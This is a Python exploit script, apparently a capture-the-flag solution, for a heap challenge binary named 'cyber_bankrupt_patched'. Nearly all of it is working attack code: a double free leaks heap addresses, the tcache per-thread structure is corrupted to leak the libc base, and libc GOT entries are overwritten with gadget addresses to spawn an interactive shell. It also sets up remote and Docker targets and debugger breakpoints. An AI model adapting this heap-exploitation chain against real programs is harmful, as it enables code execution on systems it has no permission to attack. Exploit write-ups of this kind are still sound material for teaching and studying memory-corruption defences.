#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./cyber_bankrupt_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x0000000000013CB
brva 0x00000000000150D
brva 0x0000000000014B2
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv)

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def choice(option: int):
    slna(b'> ', option)

def add(id, size, data):
    choice(1)
    slna(b'ID: ', id)
    slna(b'transfer: ', size)
    sa(b'receiver: ', data)

def free(id):
    choice(2)
    slna(b'ID: ', id)

def show(id):
    choice(3)
    slna(b'ID: ', id)

# ==================== EXPLOIT ====================
p = start()

sla(b'pin: ', b'6969')

## Leak address

add(0, 0xa8, b'0')
add(0, 0x248, b'1')

free(0)
free(0)

show(0)
heap_leak = u64(rb(6).ljust(0x8, b'\0'))
# heap_base = heap_leak - 0x720
heap_base = heap_leak - 0x310
info('heap leak @ %#x', heap_leak)
success('heap base @ %#x', heap_base)

add(0, 0x248, p64(heap_base+0x10))
add(0, 0x248, b'3')

perth_struct = p64(0)
perth_struct += p64(0x800)
perth_struct += p64(0)*6
perth_struct += p64(0)*(0xb-0x2)
# perth_struct += p64(heap_base+0x670)
perth_struct += p64(heap_base+0x670-0x410)

add(0, 0x248, perth_struct)

free(0)
add(0, 0xa8, b"4")
free(0)

# debug()
show(0)

libc.address = u64(rb(6).ljust(0x8, b'\0')) - 0x3ebca0
success('libc base @ %#x', libc.address)
libc_got = libc.address + 0x3eb0a8 - 0x18

## Overwrite libc GOT
perth_struct = p64(0)*16
perth_struct += p64(libc_got)

add(0, 0x248, perth_struct)
add(0, 0x98, p64(libc.address + 0x18af90) + p64(libc.address + 0xabea0) + p64(libc.address+0x40a250) + p64(libc.address + 0x4f322))

interactive()
